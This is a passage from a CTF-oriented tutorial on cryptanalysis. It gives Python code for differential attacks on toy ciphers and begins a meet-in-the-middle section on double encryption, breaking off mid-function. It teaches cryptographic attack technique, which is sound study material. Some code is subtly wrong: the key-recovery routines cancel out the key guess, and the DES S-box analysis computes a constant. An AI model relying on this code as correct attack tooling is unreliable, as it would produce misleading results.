                c2 = sbox[c2]
        
        # Check if output difference matches
        actual_output_diff = c1 ^ c2
        if actual_output_diff == expected_output_diff:
            success_count += 1
    
    observed_prob = success_count / num_trials
    print(f"Observed probability: {observed_prob:.6f} ({success_count}/{num_trials})")
    print(f"Ratio (observed/expected): {observed_prob / characteristic.total_probability:.2f}")
    
    return observed_prob

# Verify a characteristic
if best_chars:
    verify_characteristic_experimentally(best_chars[0], simple_sbox, num_trials=10000)
```

**Characteristic clustering:**

```python
#!/usr/bin/env python3

def cluster_characteristics(characteristics):
    """
    Group characteristics by input/output difference pairs
    Multiple paths may lead to same overall differential
    """
    clusters = defaultdict(list)
    
    for char in characteristics:
        input_diff, output_diff = char.get_input_output()
        key = (input_diff, output_diff)
        clusters[key].append(char)
    
    return clusters

def calculate_combined_probability(cluster):
    """
    Calculate total probability for all characteristics in cluster
    P(Δ_in → Δ_out) = sum of individual characteristic probabilities
    
    [Inference] Assumes independence of different paths
    """
    total_prob = sum(char.total_probability for char in cluster)
    return total_prob

# Cluster and analyze
if len(best_chars) > 0:
    print("\n" + "=" * 60)
    print("CHARACTERISTIC CLUSTERING")
    print("=" * 60)
    
    clusters = cluster_characteristics(best_chars)
    
    for (in_diff, out_diff), chars in sorted(clusters.items(), 
                                              key=lambda x: len(x[1]), 
                                              reverse=True):
        combined_prob = calculate_combined_probability(chars)
        print(f"\nDifferential: 0x{in_diff:x} → 0x{out_diff:x}")
        print(f"  Paths: {len(chars)}")
        print(f"  Combined probability: {combined_prob:.6e}")
        print(f"  Expected pairs: {1/combined_prob:.0f}")
```

**Truncated differentials:**

```python
#!/usr/bin/env python3

def analyze_truncated_differential(sbox, input_mask, output_mask):
    """
    Analyze truncated differential - only some bits specified
    
    Example: input_mask=0xF (only low 4 bits matter)
             output_mask=0xF0 (only high 4 bits matter)
    
    [Inference] Truncated differentials can have higher probability
    """
    n = len(sbox)
    count = 0
    total = 0
    
    for input_diff in range(n):
        # Check if input difference matches mask
        if (input_diff & ~input_mask) == 0 and input_diff != 0:
            for x in range(n):
                x_prime = x ^ input_diff
                if x_prime < n:
                    output_diff = sbox[x] ^ sbox[x_prime]
                    
                    # Check if output matches mask
                    if (output_diff & output_mask) == output_diff:
                        count += 1
                    total += 1
    
    probability = count / total if total > 0 else 0
    
    print(f"Truncated Differential Analysis:")
    print(f"  Input mask:  0x{input_mask:x}")
    print(f"  Output mask: 0x{output_mask:x}")
    print(f"  Matching pairs: {count}/{total}")
    print(f"  Probability: {probability:.4f}")
    
    return probability

# Example: Analyze truncated differential
analyze_truncated_differential(simple_sbox, input_mask=0x3, output_mask=0xC)
```

### Practical Attack Implementation

**Key recovery using differentials:**

```python
#!/usr/bin/env python3

def differential_key_recovery_attack(oracle, characteristic, num_pairs=1000):
    """
    Recover last round key using differential cryptanalysis
    
    oracle: function that encrypts plaintext (simulates chosen-plaintext access)
    characteristic: known good differential through n-1 rounds
    
    [Unverified] Simplified educational implementation
    """
    print("=" * 60)
    print("DIFFERENTIAL KEY RECOVERY ATTACK")
    print("=" * 60)
    
    input_diff, expected_penultimate_diff = characteristic.get_input_output()
    
    # Key candidate counters
    key_scores = defaultdict(int)
    key_space = 256  # Assuming 8-bit key
    
    print(f"\nGenerating {num_pairs} plaintext pairs...")
    print(f"Input difference: 0x{input_diff:x}")
    
    pairs_collected = 0
    
    for _ in range(num_pairs):
        # Generate random plaintext pair with desired difference
        p1 = random.randint(0, 255)
        p2 = p1 ^ input_diff
        
        # Encrypt both (through oracle)
        c1 = oracle(p1)
        c2 = oracle(p2)
        
        ciphertext_diff = c1 ^ c2
        
        # For each possible last-round key guess
        for key_guess in range(key_space):
            # Partially decrypt last round
            partial_c1 = c1 ^ key_guess
            partial_c2 = c2 ^ key_guess
            
            # Check if this produces expected difference
            partial_diff = partial_c1 ^ partial_c2
            
            if partial_diff == expected_penultimate_diff:
                key_scores[key_guess] += 1
        
        pairs_collected += 1
    
    # Find most frequent key candidate
    if key_scores:
        top_keys = sorted(key_scores.items(), key=lambda x: x[1], reverse=True)[:5]
        
        print(f"\nTop key candidates:")
        print(f"{'Key':>6} {'Count':>8} {'Confidence':>12}")
        print("-" * 30)
        
        for key, count in top_keys:
            confidence = count / pairs_collected
            print(f"0x{key:02x}   {count:>8} {confidence:>11.2%}")
        
        return top_keys[0][0]  # Return best key
    
    return None

# Simulation oracle (toy cipher)
SECRET_KEY = 0x2A

def toy_encryption_oracle(plaintext):
    """
    Toy cipher for demonstration:
    1. XOR with key
    2. Apply S-box
    
    [Unverified] Real ciphers much more complex
    """
    intermediate = plaintext ^ SECRET_KEY
    if intermediate < len(simple_sbox):
        ciphertext = simple_sbox[intermediate]
    else:
        ciphertext = intermediate
    return ciphertext

# Create simple 1-round characteristic
attack_char = DifferentialCharacteristic()
attack_char.add_round(input_diff=0x01, output_diff=0x05, probability=0.25)

print(f"True key: 0x{SECRET_KEY:02x}")
recovered_key = differential_key_recovery_attack(
    toy_encryption_oracle, 
    attack_char, 
    num_pairs=500
)

if recovered_key is not None:
    print(f"\nRecovered key: 0x{recovered_key:02x}")
    print(f"Attack successful: {recovered_key == SECRET_KEY}")
```

**Differential distinguisher:**

```python
#!/usr/bin/env python3

def differential_distinguisher(oracle, characteristic, num_tests=1000, threshold=0.01):
    """
    Distinguish cipher from random permutation using differential
    
    If differential probability significantly > random, cipher is distinguishable
    
    Returns: True if distinguishable, False otherwise
    """
    input_diff, output_diff = characteristic.get_input_output()
    expected_prob = characteristic.total_probability
    random_prob = 1 / 256  # For 8-bit block
    
    print("=" * 60)
    print("DIFFERENTIAL DISTINGUISHER")
    print("=" * 60)
    print(f"Characteristic: 0x{input_diff:x} → 0x{output_diff:x}")
    print(f"Expected probability: {expected_prob:.6f}")
    print(f"Random probability: {random_prob:.6f}")
    print(f"Running {num_tests} tests...\n")
    
    success_count = 0
    
    for _ in range(num_tests):
        p1 = random.randint(0, 255)
        p2 = p1 ^ input_diff
        
        c1 = oracle(p1)
        c2 = oracle(p2)
        
        actual_diff = c1 ^ c2
        if actual_diff == output_diff:
            success_count += 1
    
    observed_prob = success_count / num_tests
    
    print(f"Observed probability: {observed_prob:.6f}")
    print(f"Difference from random: {abs(observed_prob - random_prob):.6f}")
    
    # Statistical test
    distinguishable = abs(observed_prob - random_prob) > threshold
    
    print(f"\nDistinguishable: {distinguishable}")
    
    if distinguishable:
        print(f"Cipher exhibits non-random behavior!")
    else:
        print(f"Indistinguishable from random within threshold")
    
    return distinguishable

# Test distinguisher
distinguishable = differential_distinguisher(
    toy_encryption_oracle,
    attack_char,
    num_tests=1000
)
```

### Advanced Techniques

**Impossible differentials:**

```python
#!/usr/bin/env python3

def find_impossible_differentials(sbox, num_rounds=2):
    """
    Find impossible differentials - input/output differences that never occur
    
    [Inference] Useful for attacks on ciphers with good differential properties
    """
    n = len(sbox)
    ddt = analyze_sbox_differences(sbox)
    
    # Find all possible differentials through num_rounds
    possible = set()
    
    if num_rounds == 1:
        # Single round
        for in_diff in range(n):
            for out_diff in range(n):
                if ddt[in_diff][out_diff] > 0:
                    possible.add((in_diff, out_diff))
    else:
        # Multiple rounds - build reachability
        for in_diff in range(n):
            reachable = {in_diff}
            
            for _ in range(num_rounds):
                next_reachable = set()
                for curr_diff in reachable:
                    for out_diff in range(n):
                        if curr_diff < n and ddt[curr_diff][out_diff] > 0:
                            next_reachable.add(out_diff)
                reachable = next_reachable
            
            for final_diff in reachable:
                possible.add((in_diff, final_diff))
    
    # All differentials minus possible ones = impossible
    all_diffs = set((i, j) for i in range(1, n) for j in range(n))
    impossible = all_diffs - possible
    
    print(f"Impossible Differentials ({num_rounds} rounds):")
    print(f"  Total possible: {len(possible)}")
    print(f"  Total impossible: {len(impossible)}")
    
    # Show examples
    if impossible:
        print(f"\nExample impossible differentials:")
        for i, (in_d, out_d) in enumerate(list(impossible)[:10]):
            print(f"  0x{in_d:x} ↛ 0x{out_d:x}")
    
    return impossible

impossible = find_impossible_differentials(simple_sbox, num_rounds=2)
```

**Higher-order differentials:**

```python
#!/usr/bin/env python3

def second_order_differential(func, x1, x2, x3):
    """
    Calculate second-order differential
    Δ²f(x1, x2, x3) = f(x1) ⊕ f(x2) ⊕ f(x3) ⊕ f(x1⊕x2⊕x3)
    
    [Inference] Useful against ciphers resistant to first-order differentials
    """
    x4 = x1 ^ x2 ^ x3
    result = func(x1) ^ func(x2) ^ func(x3) ^ func(x4)
    return result

def analyze_second_order_differential(sbox):
    """Analyze second-order differential properties"""
    n = len(sbox)
    
    # Count zero second-order differentials
    zero_count = 0
    total_count = 0
    
    for x1 in range(n):
        for x2 in range(x1 + 1, n):
            for x3 in range(x2 + 1, n):
                sod = second_order_differential(lambda x: sbox[x] if x < n else 0, x1, x2, x3)
                
                if sod == 0:
                    zero_count += 1
                total_count += 1
    
    probability = zero_count / total_count if total_count > 0 else 0
    
    print(f"Second-Order Differential Analysis:")
    print(f"  Zero differentials: {zero_count}/{total_count}")
    print(f"  Probability: {probability:.4f}")
    print(f"  Expected (random): {1/n:.4f}")
    
    if abs(probability - 1/n) > 0.05:
        print(f"  [Inference] S-box shows non-random second-order behavior")
    
    return probability

# Analyze second-order properties
analyze_second_order_differential(simple_sbox)
```

**Boomerang attack (differential variant):**

```python
#!/usr/bin/env python3

def boomerang_distinguisher(oracle_encrypt, oracle_decrypt, 
                           differential_1, differential_2, num_tests=1000):
    """
    Boomerang attack - uses two short differentials instead of one long one
    
    Structure:
    E = E₁ ∘ E₀  (cipher split into two parts)
    
    Differential 1: α → β through E₀ (probability p)
    Differential 2: γ → δ through E₁ (probability q)
    
    Boomerang probability: (pq)²
    
    [Unverified] Requires specific cipher structure and oracles
    """
    alpha, beta = differential_1
    gamma, delta = differential_2
    
    print("=" * 60)
    print("BOOMERANG DISTINGUISHER")
    print("=" * 60)
    print(f"Differential 1: 0x{alpha:x} → 0x{beta:x}")
    print(f"Differential 2: 0x{gamma:x} → 0x{delta:x}")
    print(f"Running {num_tests} tests...\n")
    
    success_count = 0
    
    for _ in range(num_tests):
        # 1. Choose random plaintext pair with difference α
        p1 = random.randint(0, 255)
        p2 = p1 ^ alpha
        
        # 2. Encrypt both
        c1 = oracle_encrypt(p1)
        c2 = oracle_encrypt(p2)
        
        # 3. Apply difference γ to ciphertexts
        c3 = c1 ^ gamma
        c4 = c2 ^ gamma
        
        # 4. Decrypt
        p3 = oracle_decrypt(c3)
        p4 = oracle_decrypt(c4)
        
        # 5. Check if plaintext difference is δ
        plaintext_diff = p3 ^ p4
        
        if plaintext_diff == delta:
            success_count += 1
    
    observed_prob = success_count / num_tests
    random_prob = 1 / 256
    
    print(f"Observed probability: {observed_prob:.6f}")
    print(f"Random probability: {random_prob:.6f}")
    print(f"Distinguishable: {observed_prob > random_prob * 2}")
    
    return observed_prob > random_prob * 2

# Example (requires proper oracles for meaningful results)
# [Inference] Shown for educational structure only
```

**Related-key differential:**

```python
#!/usr/bin/env python3

def related_key_differential_analysis(oracle_with_key, key1, key2, 
                                     plaintext_diff, num_tests=1000):
    """
    Related-key differential attack
    Analyzes differences when both plaintext AND key change
    
    ΔP: plaintext difference
    ΔK: key difference
    ΔC: resulting ciphertext difference
    
    [Inference] Effective against ciphers with weak key schedules
    """
    key_diff = key1 ^ key2
    
    print("=" * 60)
    print("RELATED-KEY DIFFERENTIAL ANALYSIS")
    print("=" * 60)
    print(f"Key 1: 0x{key1:02x}")
    print(f"Key 2: 0x{key2:02x}")
    print(f"Key difference: 0x{key_diff:02x}")
    print(f"Plaintext difference: 0x{plaintext_diff:02x}\n")
    
    # Track ciphertext differences
    ciphertext_diffs = defaultdict(int)
    
    for _ in range(num_tests):
        p1 = random.randint(0, 255)
        p2 = p1 ^ plaintext_diff
        
        # Encrypt with different keys
        c1 = oracle_with_key(p1, key1)
        c2 = oracle_with_key(p2, key2)
        
        cipher_diff = c1 ^ c2
        ciphertext_diffs[cipher_diff] += 1
    
    # Find most common output differences
    top_diffs = sorted(ciphertext_diffs.items(), key=lambda x: x[1], reverse=True)[:5]
    
    print(f"Top ciphertext differences:")
    print(f"{'Difference':>12} {'Count':>8} {'Probability':>12}")
    print("-" * 40)
    
    for diff, count in top_diffs:
        prob = count / num_tests
        print(f"0x{diff:02x}         {count:>8} {prob:>11.2%}")
    
    # Check if distribution is non-uniform
    max_prob = top_diffs[0][1] / num_tests
    random_prob = 1 / 256
    
    print(f"\nMax probability: {max_prob:.4f}")
    print(f"Random expectation: {random_prob:.4f}")
    print(f"Exploitable: {max_prob > random_prob * 3}")
    
    return top_diffs

# Example with related keys
def toy_cipher_with_key(plaintext, key):
    """Simple cipher for related-key demo"""
    step1 = plaintext ^ key
    if step1 < len(simple_sbox):
        step2 = simple_sbox[step1]
    else:
        step2 = step1
    return step2 ^ key

related_key_differential_analysis(
    toy_cipher_with_key,
    key1=0x3C,
    key2=0x3D,
    plaintext_diff=0x01,
    num_tests=1000
)
```

### CTF-Specific Attack Patterns

**Reduced-round attack template:**

```python
#!/usr/bin/env python3

def attack_reduced_round_cipher(oracle, known_rounds, sbox):
    """
    Template for attacking reduced-round ciphers in CTF
    
    Common pattern:
    1. Full cipher has N rounds (secure)
    2. Challenge uses N-k rounds (vulnerable)
    3. Find differential through N-k-1 rounds
    4. Recover last round key
    
    [Inference] Most CTF differential challenges use 3-6 rounds
    """
    print("=" * 60)
    print("REDUCED-ROUND CIPHER ATTACK")
    print("=" * 60)
    print(f"Cipher rounds: {known_rounds}")
    
    # Step 1: Build DDT
    print("\n[1] Building Difference Distribution Table...")
    ddt = analyze_sbox_differences(sbox)
    
    # Step 2: Find best differential through (rounds - 1)
    print(f"[2] Searching for {known_rounds - 1}-round differential...")
    characteristics = find_best_characteristics(sbox, num_rounds=known_rounds - 1, top_n=3)
    
    if not characteristics:
        print("[-] No good characteristics found!")
        return None
    
    best_char = characteristics[0]
    print(f"[+] Best characteristic:")
    print(best_char)
    
    # Step 3: Collect plaintext-ciphertext pairs
    print(f"[3] Collecting plaintext-ciphertext pairs...")
    pairs_needed = int(1 / best_char.total_probability * 10)  # 10x for confidence
    print(f"    Estimated pairs needed: {pairs_needed}")
    
    pairs = []
    input_diff, _ = best_char.get_input_output()
    
    for _ in range(min(pairs_needed, 10000)):  # Cap at 10k for demo
        p1 = random.randint(0, 255)
        p2 = p1 ^ input_diff
        c1 = oracle(p1)
        c2 = oracle(p2)
        pairs.append((p1, p2, c1, c2))
    
    print(f"    Collected {len(pairs)} pairs")
    
    # Step 4: Key recovery
    print(f"[4] Attempting last-round key recovery...")
    key_candidates = differential_key_recovery_last_round(pairs, best_char, sbox)
    
    return key_candidates

def differential_key_recovery_last_round(pairs, characteristic, sbox):
    """Recover last round key from pairs and characteristic"""
    key_scores = defaultdict(int)
    _, expected_diff = characteristic.get_input_output()
    
    for p1, p2, c1, c2 in pairs:
        # Try each possible last-round key
        for key_guess in range(256):
            # Partially decrypt
            partial_c1 = c1 ^ key_guess
            partial_c2 = c2 ^ key_guess
            
            # Apply inverse S-box if available
            if partial_c1 < len(sbox) and partial_c2 < len(sbox):
                # For S-box inversion, need to build inverse
                # [Inference] Simplified: just check difference
                partial_diff = partial_c1 ^ partial_c2
                
                if partial_diff == expected_diff:
                    key_scores[key_guess] += 1
    
    # Return top candidates
    top_keys = sorted(key_scores.items(), key=lambda x: x[1], reverse=True)[:5]
    
    print(f"\n    Top key candidates:")
    for key, score in top_keys:
        print(f"      0x{key:02x}: {score} matches")
    
    return top_keys

# Demo attack
print("\nDEMONSTRATION: Attacking 3-round cipher\n")
attack_reduced_round_cipher(toy_encryption_oracle, known_rounds=3, sbox=simple_sbox)
```

**Custom S-box weakness detection:**

```python
#!/usr/bin/env python3

def evaluate_sbox_security(sbox):
    """
    Evaluate S-box resistance to differential cryptanalysis
    
    Metrics:
    - Maximum differential probability
    - Average differential probability
    - Number of impossible differentials
    - Linearity (related to differential/linear duality)
    
    [Inference] Good S-boxes have low max differential probability
    """
    print("=" * 60)
    print("S-BOX SECURITY EVALUATION")
    print("=" * 60)
    
    n = len(sbox)
    ddt = analyze_sbox_differences(sbox)
    
    # 1. Maximum differential probability
    max_count = 0
    max_diff_pair = None
    
    for in_diff in range(1, n):  # Skip zero difference
        for out_diff in range(n):
            if ddt[in_diff][out_diff] > max_count:
                max_count = ddt[in_diff][out_diff]
                max_diff_pair = (in_diff, out_diff)
    
    max_prob = max_count / n
    print(f"\n[*] Maximum Differential Probability:")
    print(f"    Value: {max_prob:.4f} ({max_count}/{n})")
    print(f"    Differential: 0x{max_diff_pair[0]:x} → 0x{max_diff_pair[1]:x}")
    
    # Ideal: 2/n for n-bit S-box
    ideal_max = 2 / n
    print(f"    Ideal maximum: {ideal_max:.4f}")
    
    if max_prob > ideal_max * 2:
        print(f"    [!] WEAK: Differential probability too high!")
    else:
        print(f"    [+] GOOD: Within acceptable range")
    
    # 2. Average non-trivial differential probability
    total_prob = 0
    count = 0
    
    for in_diff in range(1, n):
        for out_diff in range(n):
            if ddt[in_diff][out_diff] > 0:
                prob = ddt[in_diff][out_diff] / n
                total_prob += prob
                count += 1
    
    avg_prob = total_prob / count if count > 0 else 0
    print(f"\n[*] Average Differential Probability:")
    print(f"    Value: {avg_prob:.4f}")
    
    # 3. Distribution uniformity
    non_zero_entries = sum(1 for i in range(1, n) for j in range(n) if ddt[i][j] > 0)
    total_entries = (n - 1) * n
    coverage = non_zero_entries / total_entries
    
    print(f"\n[*] DDT Coverage:")
    print(f"    Non-zero entries: {non_zero_entries}/{total_entries} ({coverage:.1%})")
    
    # 4. Overall assessment
    print(f"\n[*] Overall Assessment:")
    
    vulnerabilities = []
    if max_prob > ideal_max * 2:
        vulnerabilities.append("High maximum differential probability")
    if coverage < 0.5:
        vulnerabilities.append("Poor DDT coverage (many impossible differentials)")
    
    if vulnerabilities:
        print(f"    [!] VULNERABLE to differential cryptanalysis:")
        for vuln in vulnerabilities:
            print(f"        - {vuln}")
    else:
        print(f"    [+] Reasonably secure against basic differential attacks")
    
    return {
        'max_prob': max_prob,
        'avg_prob': avg_prob,
        'coverage': coverage,
        'vulnerable': len(vulnerabilities) > 0
    }

# Evaluate the example S-box
security = evaluate_sbox_security(simple_sbox)

print("\n" + "=" * 60)
print("COMPARISON S-BOXES")
print("=" * 60)

# Compare with a different S-box (potentially weaker)
weak_sbox = [i for i in range(16)]  # Identity mapping (very weak!)
print("\nWeak S-box (identity):")
weak_security = evaluate_sbox_security(weak_sbox)
```

**Differential cryptanalysis automation script:**

```python
#!/usr/bin/env python3

def automated_differential_attack(oracle, block_size=8, max_rounds=5):
    """
    Fully automated differential attack framework
    
    Steps:
    1. Detect S-box from oracle behavior (if unknown)
    2. Build DDT
    3. Find best characteristics
    4. Execute key recovery
    
    [Unverified] Success depends on cipher weakness and oracle access
    """
    print("=" * 60)
    print("AUTOMATED DIFFERENTIAL ATTACK FRAMEWORK")
    print("=" * 60)
    
    # Step 1: Detect S-box behavior (if possible)
    print("\n[1] Analyzing oracle behavior...")
    print(f"    Block size: {block_size} bits")
    
    # Sample oracle responses
    samples = []
    for i in range(min(256, 2**block_size)):
        output = oracle(i)
        samples.append((i, output))
    
    print(f"    Collected {len(samples)} input-output pairs")
    
    # Step 2: Attempt to extract S-box
    print("\n[2] Attempting S-box extraction...")
    # [Inference] This assumes oracle is simple enough to reverse-engineer
    # Real ciphers would require more sophisticated techniques
    
    inferred_sbox = [out for inp, out in sorted(samples)]
    print(f"    Extracted {len(inferred_sbox)}-element S-box")
    
    # Step 3: Analyze S-box
    print("\n[3] Analyzing S-box security...")
    security = evaluate_sbox_security(inferred_sbox)
    
    if not security['vulnerable']:
        print("    [-] S-box appears secure. Attack may not succeed.")
        return None
    
    print("    [+] S-box shows weakness. Proceeding...")
    
    # Step 4: Find best characteristics
    print(f"\n[4] Searching for characteristics (up to {max_rounds} rounds)...")
    
    best_char = None
    best_prob = 0
    
    for rounds in range(1, max_rounds + 1):
        chars = find_best_characteristics(inferred_sbox, num_rounds=rounds, top_n=1)
        if chars and chars[0].total_probability > best_prob:
            best_char = chars[0]
            best_prob = chars[0].total_probability
    
    if not best_char:
        print("    [-] No usable characteristics found")
        return None
    
    print(f"    [+] Best characteristic found:")
    print(f"        Rounds: {len(best_char.rounds)}")
    print(f"        Probability: {best_char.total_probability:.6e}")
    
    # Step 5: Execute attack
    print("\n[5] Executing key recovery attack...")
    
    pairs_needed = max(int(1 / best_char.total_probability * 10), 100)
    print(f"    Collecting {pairs_needed} pairs...")
    
    # Collect pairs
    input_diff, _ = best_char.get_input_output()
    pairs = []
    
    for _ in range(pairs_needed):
        p1 = random.randint(0, 2**block_size - 1)
        p2 = p1 ^ input_diff
        c1 = oracle(p1)
        c2 = oracle(p2)
        pairs.append((p1, p2, c1, c2))
    
    # Key recovery
    key_candidates = differential_key_recovery_last_round(pairs, best_char, inferred_sbox)
    
    print("\n[6] Attack complete!")
    print(f"    Most likely key: 0x{key_candidates[0][0]:02x}")
    
    return key_candidates[0][0]

# Run automated attack
print("RUNNING AUTOMATED ATTACK ON TOY CIPHER\n")
recovered = automated_differential_attack(toy_encryption_oracle, block_size=8, max_rounds=3)

if recovered is not None:
    print(f"\n{'='*60}")
    print(f"RESULT: Recovered key = 0x{recovered:02x}")
    print(f"Actual key = 0x{SECRET_KEY:02x}")
    print(f"Success: {recovered == SECRET_KEY}")
    print(f"{'='*60}")
```

### Visualization and Analysis Tools

**DDT heatmap generator:**

```python
#!/usr/bin/env python3

def generate_ddt_heatmap_ascii(ddt, max_value=None):
    """Generate ASCII heatmap of DDT"""
    n = len(ddt)
    
    if max_value is None:
        max_value = max(max(row) for row in ddt)
    
    # Use characters for different intensity levels
    chars = ' .:-=+*#%@'
    
    print("\nDDT Heatmap (higher intensity = more frequent):")
    print("=" * (n + 10))
    
    # Header
    print("     ", end="")
    for i in range(min(n, 16)):
        print(f"{i:x}", end="")
    print()
    
    # Rows
    for i in range(min(n, 16)):
        print(f"{i:2x} | ", end="")
        for j in range(min(n, 16)):
            value = ddt[i][j]
            intensity = int((value / max_value) * (len(chars) - 1)) if max_value > 0 else 0
            print(chars[intensity], end="")
        print()

# Generate heatmap
print("\nDifference Distribution Table Visualization:")
generate_ddt_heatmap_ascii(ddt)
```

**Characteristic visualization:**

```python
#!/usr/bin/env python3

def visualize_characteristic_flow(characteristic):
    """
    ASCII visualization of difference propagation through rounds
    """
    print("\nCharacteristic Flow Diagram:")
    print("=" * 60)
    
    for i, round_data in enumerate(characteristic.rounds):
        in_diff = round_data['input_diff']
        out_diff = round_data['output_diff']
        prob = round_data['probability']
        
        # Input
        print(f"Round {i}:")
        print(f"  Input:  {format_binary_visual(in_diff, 8)}")
        print(f"          Δ = 0x{in_diff:02x}")
        print(f"            |")
        print(f"            | [S-box transformation]")
        print(f"            | probability = {prob:.4f}")
        print(f"            ↓")
        print(f"  Output: {format_binary_visual(out_diff, 8)}")
        print(f"          Δ = 0x{out_diff:02x}")
        
        if i < len(characteristic.rounds) - 1:
            print(f"            |")
            print(f"            ↓")
    
    print(f"\nTotal probability: {characteristic.total_probability:.6e}")

def format_binary_visual(value, bits=8):
    """Format binary with visual grouping"""
    binary = format(value, f'0{bits}b')
    # Group in nibbles
    return ' '.join(binary[i:i+4] for i in range(0, len(binary), 4))

# Visualize a characteristic
if best_chars:
    visualize_characteristic_flow(best_chars[0])
```

### Real-World Cipher Analysis

**DES S-box differential properties:**

```python
#!/usr/bin/env python3

# DES S-box 1 (6-bit input → 4-bit output)
DES_S1 = [
    [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7],
    [0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8],
    [4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0],
    [15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13]
]

def analyze_des_sbox(sbox_2d):
    """
    Analyze DES S-box differential properties
    DES S-boxes are 6-bit input, 4-bit output with special structure
    
    [Unverified] DES designed to resist differential cryptanalysis before it was public
    """
    print("DES S-box Differential Analysis")
    print("=" * 60)
    
    # Flatten S-box for analysis
    flat_sbox = []
    for row in sbox_2d:
        flat_sbox.extend(row)
    
    # Analyze as 6-bit S-box (64 entries, but only 16 output values)
    # [Inference] Actual DES S-box structure more complex
    print(f"S-box size: {len(flat_sbox)} entries → 4-bit output")
    
    # Build simplified DDT
    n = len(flat_sbox)
    max_diff_prob = 0
    
    for in_diff in range(1, min(n, 64)):
        for x in range(min(n, 64)):
            x_prime = x ^ in_diff
            if x_prime < len(flat_sbox):
                out_diff = flat_sbox[x] ^ flat_sbox[x_prime]
                prob = 1 / 64  # Each occurrence
                if prob > max_diff_prob:
                    max_diff_prob = prob
    
    print(f"\nMaximum differential probability: {max_diff_prob:.4f}")
    print(f"DES design criterion: < 1/4 (achieved: {max_diff_prob < 0.25})")

analyze_des_sbox(DES_S1)
```

### Important Related Topics

- **Linear cryptanalysis** (dual to differential, uses linear approximations)
- **Algebraic attacks** (solving cipher as equation system)
- **Side-channel analysis** (timing, power consumption during differential attacks)
- **SAT/SMT solvers for cryptanalysis** (automated characteristic search)
- **Integral cryptanalysis** (generalizes differential to sets)
- **Division property** (modern refinement for lightweight ciphers)

---

## Meet-in-the-Middle Attack

### Double Encryption

Meet-in-the-Middle (MITM) attacks exploit the structure of multiple encryption rounds by computing encryptions forward from plaintext and decryptions backward from ciphertext, then finding matches in the middle. This reduces the complexity of attacking double encryption from 2^(2n) to 2^(n+1), demonstrating why simply doubling encryption provides minimal security improvement.

**Attack Principle**:

For double encryption: C = E_k2(E_k1(P))

**Naive approach**: Try all 2^(2n) key combinations - infeasible **MITM approach**:

1. Compute E_k1(P) for all k1 → Store 2^n values
2. Compute D_k2(C) for all k2 → Compare with stored values
3. Match reveals (k1, k2) pair

**Complexity**: 2^n encryptions + 2^n decryptions + 2^n storage = O(2^(n+1)) time, O(2^n) space

**Theoretical Implementation**:

```python
def mitm_double_encryption_concept(plaintext, ciphertext, encrypt_func, decrypt_func, keyspace):
    """
    Conceptual MITM attack on double encryption
    
    Args:
        plaintext: Known plaintext
        ciphertext: Corresponding ciphertext
        encrypt_func: Encryption function E(key, data)
        decrypt_func: Decryption function D(key, data)
        keyspace: Iterator of possible keys
    
    Returns:
        (key1, key2) tuple if found
    """
    # Phase 1: Build forward table
    print("[*] Phase 1: Computing forward encryptions...")
    forward_table = {}
    
    for key1 in keyspace:
        intermediate = encrypt_func(key1, plaintext)
        forward_table[intermediate] = key1
    
    print(f"[*] Built table with {len(forward_table)} entries")
    
    # Phase 2: Compute backward and check
    print("[*] Phase 2: Computing backward decryptions...")
    
    for key2 in keyspace:
        intermediate = decrypt_func(key2, ciphertext)
        
        if intermediate in forward_table:
            key1 = forward_table[intermediate]
            print(f"[+] Match found!")
            return (key1, key2)
    
    return None, None

# Note: This requires 2^n storage which is often impractical
```

**Practical Example - Small Keyspace**:

```python
# Simple 16-bit key double encryption (for demonstration)
def simple_encrypt(key, data):
    """Simple XOR-based encryption"""
    return bytes([b ^ ((key >> (i % 16)) & 0xFF) for i, b in enumerate(data)])

def mitm_attack_small_keyspace():
    """
    MITM attack on 16-bit double encryption
    Demonstrates concept with feasible computation
    """
    import os
    
    # Setup
    plaintext = b"HELLO_WORLD_TEST"
    key1_actual = 0x1234
    key2_actual = 0x5678
    
    # Double encryption
    intermediate = simple_encrypt(key1_actual, plaintext)
    ciphertext = simple_encrypt(key2_actual, intermediate)
    
    print(f"[*] Attacking double encryption...")
    print(f"[*] Plaintext: {plaintext}")
    print(f"[*] Ciphertext: {ciphertext.hex()}")
    print(f"[*] Keyspace: 2^16 = 65536 keys each")
    
    # Phase 1: Forward table
    forward_table = {}
    
    for k1 in range(0x10000):  # 2^16
        inter = simple_encrypt(k1, plaintext)
        forward_table[inter] = k1
        
        if k1 % 10000 == 0:
            print(f"    Forward progress: {k1/0x10000*100:.1f}%")
    
    print(f"[*] Forward table complete: {len(forward_table)} entries")
    
    # Phase 2: Backward search
    for k2 in range(0x10000):
        inter = simple_encrypt(k2, ciphertext)
        
        if inter in forward_table:
            k1_found = forward_table[inter]
            
            # Verify
            test_inter = simple_encrypt(k1_found, plaintext)
            test_cipher = simple_encrypt(k2, test_inter)
            
            if test_cipher == ciphertext:
                print(f"[+] Keys found!")
                print(f"    Key1: 0x{k1_found:04x} (actual: 0x{key1_actual:04x})")
                print(f"    Key2: 0x{k2:04x} (actual: 0x{key2_actual:04x})")
                return k1_found, k2
        
        if k2 % 10000 == 0:
            print(f"    Backward progress: {k2/0x10000*100:.1f}%")
    
    return None, None

# Run demonstration
# keys = mitm_attack_small_keyspace()
```

**DES Double Encryption Example**:

```python
from Crypto.Cipher import DES
import os

def mitm_double_des_reduced(plaintext, ciphertext, reduced_keyspace):
    """
    MITM attack on double DES with reduced keyspace
    
    Full DES keyspace (2^56) requires:
    - 2^56 * 8 bytes = 576 petabytes storage (impractical)
    
    This demonstrates concept with reduced keyspace
    
    Args:
        plaintext: 8-byte known plaintext
        ciphertext: Corresponding 8-byte ciphertext
        reduced_keyspace: List of candidate keys to test
    """
    print("[*] MITM Attack on Double-DES (reduced keyspace)")
    
    # Phase 1: Build forward table
    forward_table = {}
    
    for i, key1 in enumerate(reduced_keyspace):
        # DES key must be 8 bytes
        des1 = DES.new(key1, DES.MODE_ECB)
        intermediate = des1.encrypt(plaintext)
        forward_table[intermediate] = key1
        
        if i % 1000 == 0:
            print(f"    Forward: {i}/{len(reduced_keyspace)}")
    
    print(f"[*] Forward table built: {len(forward_table)} entries")
    
    # Phase 2: Backward search
    for i, key2 in enumerate(reduced_keyspace):
